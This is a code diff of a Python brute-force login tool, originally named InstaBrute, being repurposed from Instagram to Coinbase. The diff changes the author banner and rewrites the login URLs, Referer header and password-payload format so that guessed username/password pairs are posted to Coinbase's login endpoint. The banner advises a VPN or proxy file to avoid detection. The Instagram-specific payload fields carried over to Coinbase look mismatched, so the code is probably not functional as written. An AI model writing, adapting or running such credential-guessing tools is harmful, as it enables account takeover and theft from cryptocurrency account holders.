@@ -20,23 +20,18 @@ onlyPasswords = False
 
 
 print('''
-                               ....
-                                    %
-                                     ^
-                            L
-                            "F3  $r
-                           $$$$.e$"  .
-                           "$$$$$"   "
-     (insTof by 6)           $$$$c  /
-        .                   $$$$$$$P
-       ."c                      $$$
-      .$c3b                  ..J$$$$$e
-      4$$$$             .$$$$$$$$$$$$$$c
-       $$$$b           .$$$$$$$$$$$$$$$$r
-          $$$.        .$$$$$$$$$$$$$$$$$$
-           $$$c      .$$$$$$$  "$$$$$$$$$r
-Author   : Falah
-snapchat : flaah999
+                   _         _
+             (_)       | |
+  ___   ___   _  _ __  | |__    __ _  ___   ___
+ / __| / _ \ | || '_ \ | '_ \  / _` |/ __| / _ \
+| (__ | (_) || || | | || |_) || (_| |\__ \|  __/
+ \___| \___/ |_||_| |_||_.__/  \__,_||___/ \___|
+
+
+                          
+     
+Author   : Gilmarfilho
+
 depend on vpn. Please use it before running the tool or providing a proxy file           """"""""""""""""""""""""""""""""""""""""""
 ''')
 
@@ -106,14 +101,14 @@ class InstaBrute(object):
         os.system([linux, windows][os.name == 'nt'])
 
     def New_Br(self, user, pwd):
-        link = 'https://www.instagram.com/accounts/login/'
-        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+        link = 'https://www.coinbase.com/accounts/login/'
+        login_url = 'https://www.coinbase.com/accounts/login/ajax/'
 
         time = int(datetime.now().timestamp())
 
         payload = {
             'username': user,
-            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
+          'enc_password': f'#PWD_COINBASE_BROWSER:0:{time}:{pwd}',
             'queryParams': {},
             'optIntoOneTap': 'false'
         }
@@ -123,7 +118,7 @@ class InstaBrute(object):
             r = s.post(login_url, data=payload, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
-                "Referer": "https://www.instagram.com/accounts/login/",
+                "Referer": "https://www.coinbase.com/accounts/login/",
                 "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
             })
 
